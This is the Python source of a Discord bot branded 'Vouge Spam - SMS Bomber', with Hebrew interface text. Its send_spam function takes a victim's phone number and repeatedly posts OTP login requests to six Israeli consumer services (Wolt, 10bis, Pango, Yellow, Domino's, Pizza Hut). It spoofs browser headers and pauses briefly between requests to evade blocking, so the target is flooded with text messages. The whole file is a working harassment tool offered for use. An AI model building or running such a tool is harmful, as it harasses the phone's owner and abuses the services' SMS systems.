import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio, datetime
from flask import Flask
from threading import Thread

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
def keep_alive():
    Thread(target=run_flask).start()

# --- Config ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
DB_FILE = "users_data.json"
BOT_ID_SYNC = "1499077731659284540"

def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {"credits": {}, "blacklist": []}
    return {"credits": {}, "blacklist": []}

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

# --- Spam Engine ---
async def send_spam(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    
    # אתרים עם Headers ספציפיים לכל אחד
    async with httpx.AsyncClient(timeout=10.0) as client:
        targets = [
            # Wolt
            {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}, "h": {"platform": "web"}},
            # 10bis
            {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}, "h": {"Origin": "https://www.10bis.co.il"}},
            # Pango
            {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}, "h": {"Referer": "https://pango.co.il/"}},
            # Yellow
            {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}, "h": {"x-app-version": "1.0.0"}},
            # Domino's
            {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone}, "h": {"Accept": "application/json"}},
            # Pizza Hut
            {"url": "https://pizzahut.co.il/api/v1/auth/otp", "json": {"phone": phone}, "h": {"Content-Type": "application/json"}}
        ]

        common_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        
        for t in targets:
            headers = {**common_headers, **t.get("h", {})}
            try:
                await client.post(t["url"], json=t["json"], headers=headers)
                await asyncio.sleep(0.5) # השהייה קטנה למניעת חסימה
            except:
                continue

# --- Bot Core ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        self.add_view(SpamView())
        await self.tree.sync()

class SpamModal(discord.ui.Modal, title="Vouge Spam - SMS Bomber"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"💣 מתחיל הפצצה על {self.phone.value}...", ephemeral=True)
        await send_spam(self.phone.value)

class SpamView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)
    @discord.ui.button(label="Spam Phone", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="spm_btn")
    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
            return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
        await interaction.response.send_modal(SpamModal())

bot = MyBot()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    if not discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME):
        return await interaction.response.send_message("❌ אדמין בלבד!", ephemeral=True)
    embed = discord.Embed(title="🤖 Vouge Spam Me", description="גישת אדמין.", color=discord.Color.red())
    await interaction.response.send_message(embed=embed, view=SpamView())

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
